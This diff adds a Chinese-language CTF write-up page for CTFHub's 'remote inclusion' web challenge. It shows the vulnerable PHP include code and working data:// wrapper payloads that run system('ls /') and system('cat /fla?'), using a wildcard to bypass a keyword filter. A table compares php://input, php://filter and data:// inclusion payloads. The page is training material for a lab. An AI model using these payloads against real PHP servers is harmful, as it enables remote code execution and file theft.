@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【CTFHub】Web-RCE 远程包含 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+        .note { background-color: #fff5b1; padding: 10px; border-left: 5px solid #f1c40f; margin: 15px 0; border-radius: 3px; font-size: 0.95em; }
+        table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 0.95em; }
+        th, td { border: 1px solid #dfe2e5; padding: 8px 12px; text-align: left; }
+        th { background-color: #f6f8fa; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a ></p >
+    <h1>【CTFHub】Web-RCE 远程包含 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.26 | <strong>分类：</strong>CTF | <strong>标签：</strong>CTFHub, Web, RCE, 文件包含, 远程包含, data伪协议, 通配符绕过</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>CTFHub</li>
+        <li><strong>分类：</strong>Web - RCE / 远程包含</li>
+        <li><strong>题目名称：</strong>远程包含</li>
+        <li><strong>环境：</strong>VS Code + 浏览器地址栏 (URL 编码)。</li>
+        <li><strong>目标：</strong>利用远程包含漏洞，配合 <code>data://</code> 伪协议传输恶意代码，并使用通配符绕过关键字过滤，最终获取 Flag。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>本关核心考点：</strong>远程文件包含（RFI）与 <code>data://</code> 伪协议的应用，以及命令执行中的通配符绕过。</p >
+    
+    <div class="diff-box">
+        <strong>知识点（比喻说明）：</strong>
+        <ul>
+            <li><strong>远程包含（RFI）：</strong> 服务器允许 <code>include</code> 一个外部 URL。它就像一个“代购”，你给它一个网址（如 <code>http://xxx/shell.txt</code>），它会去下载并执行里面的内容。</li>
+            <li><strong>为什么需要 data:// 伪协议：</strong> 在靶场环境中，我们通常没有公网 IP 或 VPS 来让服务器远程下载我们的木马文件。这就像我们没法把武器寄到“代购”手里。<code>data://</code> 伪协议允许我们在 URL 里直接“凭空捏造”一个数据流，当作文件让服务器包含，绕过了物理传输的限制。</li>
+            <li><strong>通配符绕过（fla?）：</strong> 源码依然过滤了 <code>flag</code> 字符串。但在 Linux 系统中，<code>?</code> 可以匹配任意一个字符。<code>fla?</code> 会被系统解析为 <code>flag</code>，但字符串本身并没有包含完整的 "flag"，完美骗过检测。</li>
+        </ul>
+    </div>
+
+    <h2>3. 详细步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：源码审计与漏洞定位</h3>
+        <pre><code>&lt;?php
+error_reporting(0);
+if (isset($_GET['file'])) {
+    if (!strpos($_GET["file"], "flag")) {
+        include $_GET["file"];
+    } else {
+        echo "Hacker!!!";
+    }
+} else {
+    highlight_file(__FILE__);
+}
+?&gt;
+&lt;hr&gt;
+i don't have shell, how to get flag?&lt;br&gt;
+&lt;a href="phpinfo.php"&gt;phpinfo&lt;/a&gt;</code></pre>
+        <p class="info-line"><span class="info-label">代码逐行解析：</span></p >
+        <ul>
+            <li><code>!strpos($_GET["file"], "flag")</code>：检查 <code>file</code> 参数中是否包含 "flag"，包含则拦截。</li>
+            <li><code>include $_GET["file"];</code>：包含漏洞点。没有限制必须以 <code>php://</code> 开头，说明我们可以使用 <code>data://</code> 或 <code>http://</code> 等外部协议。</li>
+        </ul>
+        <p class="info-line"><span class="info-label">获得信息：</span>提示“i don't have shell”说明服务器上没有木马，需要我们自己“运送”一个进去。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：利用 data:// 协议执行系统命令寻找 Flag</h3>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>?file=data://text/plain,<?php system('ls /'); ?></code></p>
+            <p><strong>URL 编码版：</strong> <code>?file=data://text/plain,<?php%20system(%27ls%20/%27);%20?></code></p>
+        </div>
+        <p class="info-line"><span class="info-label">为什么要输入：</span>利用 <code>data://</code> 伪协议在 URL 中直接构造一段 PHP 代码，让服务器包含并执行。此时 URL 中没有 "flag" 字符串，成功绕过检测。</p >
+        <p class="info-line"><span class="info-label">回显结果：</span>成功列出根目录文件，发现目标文件 <code>/flag</code>。</p >
+        <p class="info-line"><span class="info-label">获得信息：</span>确认 <code>data://</code> 协议有效，目标文件绝对路径已确定。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：利用通配符绕过过滤读取 Flag</h3>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>?file=data://text/plain,<?php system('cat /fla?'); ?></code></p>
+            <p><strong>URL 编码版：</strong> <code>?file=data://text/plain,<?php%20system(%27cat%20/fla?%27);%20?></code></p>
+        </div>
+        <p class="info-line"><span class="info-label">为什么要输入：</span>如果直接写 <code>cat /flag</code>，由于参数中包含 "flag"，会被 <code>strpos</code> 拦截报错。使用通配符 <code>fla?</code>，字符串本身不含完整的 "flag"，但 Linux 系统会自动将其匹配为 <code>flag</code> 文件。</p >
+        <p class="info-line"><span class="info-label">回显结果：</span><code>ctfhub{65162ad2db27e68c40a739ca}</code></p >
+        <p class="info-line"><span class="info-label">获得信息：</span>成功获取 Flag，提交通关。</p >
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><b>为什么不用 php://input？</b> 虽然 <code>php://input</code> 也能达成目的，但本关名为“远程包含”，且源码没有强制 <code>php://</code> 前缀，使用 <code>data://</code> 更符合漏洞场景，也更便捷（不需要抓包改 POST，直接 URL 输入即可）。</li>
+        <li><b>为什么不用明文 /flag 读源码？</b> 因为 <code>include</code> 会把 <code>/flag</code> 当作 PHP 文件执行，源码可能没有回显，我们需要的是用 <code>system</code> 函数把它作为纯文本打印出来。</li>
+        <li><b>通配符匹配失败的情况：</b> 如果 <code>fla?</code> 匹配失败（例如系统存在多个以 fla 开头的文件），可以尝试使用 <code>[a-z]</code> 匹配，或者更稳妥地使用 <code>php://filter</code> 直接 base64 读源码，但要注意 filter 路径里不能出现 flag（可用 <code>fla?</code> 替代）。</li>
+    </ul>
+
+    <h2>5. 知识总结与横向对比</h2>
+    <div class="note">
+        <strong>核心心得：</strong><br>
+        到这里，我们已经完成了 RCE 技能树中关于“文件包含”的三个经典关卡。这时候回头看，<code>php://input</code>、<code>php://filter</code>、<code>data://</code> 这仨各有千秋，我们完全可以依照题目限制（是否强制 `php://` 前缀、是否需要回显源码）来选择对应的武器。
+    </div>
+
+    <table>
+        <thead>
+            <tr>
+                <th>伪协议名称</th>
+                <th>核心用途</th>
+                <th>前置条件</th>
+                <th>典型 Payload</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td><code>php://input</code></td>
+                <td>执行 POST 数据流中的代码</td>
+                <td>需 POST 请求，Body 里写代码</td>
+                <td><code>?file=php://input</code></td>
+            </tr>
+            <tr>
+                <td><code>php://filter</code></td>
+                <td>读取文件源码，不执行</td>
+                <td>GET 请求即可，配合 Base64 编码</td>
+                <td><code>?file=php://filter/read=convert.base64-encode/resource=/flag</code></td>
+            </tr>
+            <tr>
+                <td><code>data://</code></td>
+                <td>直接空投代码，无需公网VPS</td>
+                <td>需服务器开启 allow_url_include</td>
+                <td><code>?file=data://text/plain,<?php system('ls /'); ?></code></td>
+            </tr>
+        </tbody>
+    </table>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
